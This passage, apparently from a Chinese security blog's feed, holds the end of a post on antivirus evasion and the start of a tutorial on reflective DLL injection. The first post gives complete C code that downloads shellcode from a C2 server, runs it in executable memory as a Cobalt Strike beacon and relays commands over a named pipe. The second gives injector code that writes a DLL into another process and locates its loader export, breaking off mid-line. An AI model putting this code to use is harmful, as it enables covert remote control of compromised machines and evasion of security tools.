class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spawnBeacon</span><span class="params">(<span class="type">char</span>* payload, DWORD len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line">    DWORD threadId = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* alloc = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(alloc, payload, len);</span><br><span class="line"></span><br><span class="line">    threadHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)alloc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sends data to our C2 controller received from our injected beacon</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendData</span><span class="params">(SOCKET sd, <span class="type">const</span> <span class="type">char</span>* data, DWORD len)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* buffer = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    DWORD bytesWritten = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(DWORD*)buffer = len;</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer + <span class="number">4</span>, data, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (totalLen &lt; len + <span class="number">4</span>) &#123;</span><br><span class="line">        bytesWritten = <span class="built_in">send</span>(sd, buffer + totalLen, len + <span class="number">4</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">        totalLen += bytesWritten;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our C2 controller to be relayed to the injected beacon</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">recvData</span><span class="params">(SOCKET sd, DWORD* len)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    DWORD bytesReceived = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">recv</span>(sd, (<span class="type">char</span>*)len, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    buffer = (<span class="type">char</span>*)<span class="built_in">malloc</span>(*len);</span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">        bytesReceived = <span class="built_in">recv</span>(sd, buffer + totalLen, *len - totalLen, <span class="number">0</span>);</span><br><span class="line">        totalLen += bytesReceived;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates a new C2 controller connection for relaying commands</span></span><br><span class="line"><span class="function">SOCKET <span class="title">createC2Socket</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* addr, WORD port)</span> </span>&#123;</span><br><span class="line">    WSADATA wsd;</span><br><span class="line">    SOCKET sd;</span><br><span class="line">    SOCKADDR_IN sin;</span><br><span class="line">    <span class="built_in">WSAStartup</span>(<span class="number">0x0202</span>, &amp;wsd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sin, <span class="number">0</span>, <span class="built_in">sizeof</span>(sin));</span><br><span class="line">    sin.sin_family = AF_INET;</span><br><span class="line">    sin.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line">    sin.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(addr);</span><br><span class="line"></span><br><span class="line">    sd = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">    <span class="built_in">connect</span>(sd, (SOCKADDR*)&amp;sin, <span class="built_in">sizeof</span>(sin));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connects to the name pipe spawned by the injected beacon</span></span><br><span class="line"><span class="function">HANDLE <span class="title">connectBeaconPipe</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pipeName)</span> </span>&#123;</span><br><span class="line">    HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">    beaconPipe = <span class="built_in">CreateFileA</span>(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Receives data from our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">recvFromBeacon</span><span class="params">(HANDLE pipe, DWORD* len)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ReadFile</span>(pipe, len, <span class="number">4</span>, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">    buffer = (<span class="type">char</span>*)<span class="built_in">malloc</span>(*len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (totalLen &lt; *len) &#123;</span><br><span class="line">        <span class="built_in">ReadFile</span>(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">        totalLen += bytesRead;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write data to our injected beacon via a named pipe</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sendToBeacon</span><span class="params">(HANDLE pipe, <span class="type">const</span> <span class="type">char</span>* data, DWORD len)</span> </span>&#123;</span><br><span class="line">    DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteFile</span>(pipe, &amp;len, <span class="number">4</span>, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WriteFile</span>(pipe, data, len, &amp;bytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* payloadData = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a connection back to our C2 controller</span></span><br><span class="line">    SOCKET c2socket = <span class="built_in">createC2Socket</span>(<span class="string">&quot;192.168.1.4&quot;</span>, <span class="number">12222</span>);</span><br><span class="line">    payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the CS beacon</span></span><br><span class="line">    <span class="built_in">spawnBeacon</span>(payloadData, payloadLen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Loop until the pipe is up and ready to use</span></span><br><span class="line">    <span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="comment">// Create our IPC pipe for talking to the C2 beacon</span></span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        beaconPipe = <span class="built_in">connectBeaconPipe</span>(<span class="string">&quot;\\\\.\\pipe\\xpntest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="comment">// Start the pipe dance</span></span><br><span class="line">        payloadData = <span class="built_in">recvFromBeacon</span>(beaconPipe, &amp;payloadLen);</span><br><span class="line">        <span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sendData</span>(c2socket, payloadData, payloadLen);</span><br><span class="line">        <span class="built_in">free</span>(payloadData);</span><br><span class="line"></span><br><span class="line">        payloadData = <span class="built_in">recvData</span>(c2socket, &amp;payloadLen);</span><br><span class="line">        <span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sendToBeacon</span>(beaconPipe, payloadData, payloadLen);</span><br><span class="line">        <span class="built_in">free</span>(payloadData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://github.com/xpn/AppProxyC2">https://github.com/xpn/AppProxyC2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;可能是最简单一种免杀方式了&lt;/p&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg&quot;&gt;https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】反射式DLL注入详解</title>
    <link href="https://joe1sn.eu.org/2025/01/01/reflect_dll/"/>
    <id>https://joe1sn.eu.org/2025/01/01/reflect_dll/</id>
    <published>2025-01-01T06:50:28.000Z</published>
    <updated>2025-02-27T07:20:55.075Z</updated>
    
    <content type="html"><![CDATA[<p>公众号：<a href="https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A">https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A</a></p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="免杀反射式dll注入详解"><a class="markdownIt-Anchor" href="#免杀反射式dll注入详解"></a> 【免杀】反射式DLL注入详解</h1><p>在前文：<a href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">PE文件格式解析</a>、<a href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">常见的DLL和Shellcode注入方式</a>中已经讲解了基本的注入方式和PE文件结构。那么我们可以提出这样指一种注入方式：将dll的内容放到目标进程中，然后找到这个dll完成PE映射到内存的函数（假设为<code>void loader()</code>），这也要求<code>loader</code>函数一定要在导出表上。</p><ol><li>获得dll<code>loader</code>函数在内存中的虚拟地址</li><li>注入器将dll写入目标进程然后调用<code>loader</code></li><li>loader运行</li></ol><h2 id="注入器编写"><a class="markdownIt-Anchor" href="#注入器编写"></a> 注入器编写</h2><ol><li><p>打开dll文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   std::string path;</span><br><span class="line">   DWORD pid;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] pid: &quot;</span>;</span><br><span class="line">   <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">std::cin.<span class="built_in">ignore</span>();</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] DLL Path: &quot;</span>;</span><br><span class="line">   std::<span class="built_in">getline</span>(std::cin, path);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//1.打开dll文件</span></span><br><span class="line">   HANDLE hFile = <span class="built_in">CreateFileA</span>(path.<span class="built_in">c_str</span>(), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Create File Failed\n&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (dwFileSize == <span class="number">0</span>) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;File Size is Zero!\n&quot;</span>;</span><br><span class="line">       <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>将dll写入到目标进程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Address or Open Process Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">LPVOID pBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBase == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Memory Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize];</span><br><span class="line">DWORD dwReadSize;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(hFile, buffer, dwFileSize, &amp;dwReadSize, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read the file.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);</span><br><span class="line"><span class="keyword">if</span> (dwWriteSize != dwFileSize) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;File Load partitially\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>获得<code>loader</code>函数地址</p><p>按照之前提到的pe格式，就是从<code>IMAGE_DATA_DIRECTORY</code>的导出表中，利用<code>FirstThunk</code>进行遍历，如果字符串匹配，就根据结构体的相关变量找到函数地址</p><p>首先是得到RVA转换的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">VA2RVA</span><span class="params">(DWORD64 dwRva, DWORD64 BaseAddress)</span> </span>&#123;</span><br><span class="line">    DWORD64 VA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionHeader;</span><br><span class="line"></span><br><span class="line">    DWORD64 ntheader = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)-&gt;e_lfanew;</span><br><span class="line">    WORD sectionNum = ((PIMAGE_NT_HEADERS64)ntheader)-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionHeader = ntheader + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress &gt; dwRva)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        VA = ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress;</span><br><span class="line">        RVA = dwRva - VA + ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要说明下<code>IMAGE_EXPORT_DIRECTORY</code>导出表目录结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><ul><li><code>AddressOfNames</code>：函数名称地址DWORD数组，需要RVA</li><li><code>AddressOfFunctions</code>：Export函数地址DWORD数组，需要RVA</li><li><code>AddressOfNameOrdinals</code>：这是WORD数组，举个例子：目前存在着两个数组，<code>AddressOfNames[i]</code>和<code>AddressOfFunctions[j]</code>，<code>AddressOfNameOrdinals</code>存在的意义就是可以通过下标<code>i</code>找到另一个<code>j</code>，类似数据库中的<strong>关系表</strong></li></ul><p>拿到<code>AddressOfNames</code>去比较得到<code>i</code>，然后使用<code>i</code>从<code>AddressOfNameOrdinals</code>得到<code>j</code>，最后使用<code>j</code>从<code>AddressOfFunctions</code>找到函数地址</p><p>注意得是<code>AddressOfNames</code>是一个DWORD数组，并且需要根据DWORD数据重定位才能得到函数名。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">getFunctionOffset</span><span class="params">(HANDLE peBuffer, <span class="type">const</span> <span class="type">char</span>* funcionName)</span> </span>&#123;</span><br><span class="line">    DWORD64 dosHeader = (DWORD64)peBuffer;</span><br><span class="line">    DWORD64 ntHeader = dosHeader + ((PIMAGE_DOS_HEADER)peBuffer)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导入目录</span></span><br><span class="line">    DWORD64 eatDVA = ((PIMAGE_NT_HEADERS64)ntHeader)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    DWORD64 exportDirRVA = <span class="built_in">VA2RVA</span>(eatDVA, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportNameAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNames, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportFuncAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfFunctions, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportOrdinals = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNameOrdinals, dosHeader) + dosHeader;</span><br><span class="line"></span><br><span class="line">    DWORD sumNames = ((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.遍历找到i</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sumNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(dosHeader + <span class="built_in">VA2RVA</span>((<span class="built_in">PDWORD</span>(exportNameAddr))[i], dosHeader));</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;func: &quot;</span> &lt;&lt; cpExportedFunctionName &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(cpExportedFunctionName, funcionName)) &#123;</span><br><span class="line">            exportFuncAddr += (<span class="built_in">PWORD</span>(exportOrdinals)[i]);</span><br><span class="line">            <span class="keyword">return</span>  <span class="built_in">VA2RVA</span>(<span class="built_in">PDWORD</span>(exportFuncAddr)[<span class="number">0</span>], dosHeader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在远程进程中加载</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 loaderFuncAddr = <span class="built_in">getFunctionOffset</span>(buffer, <span 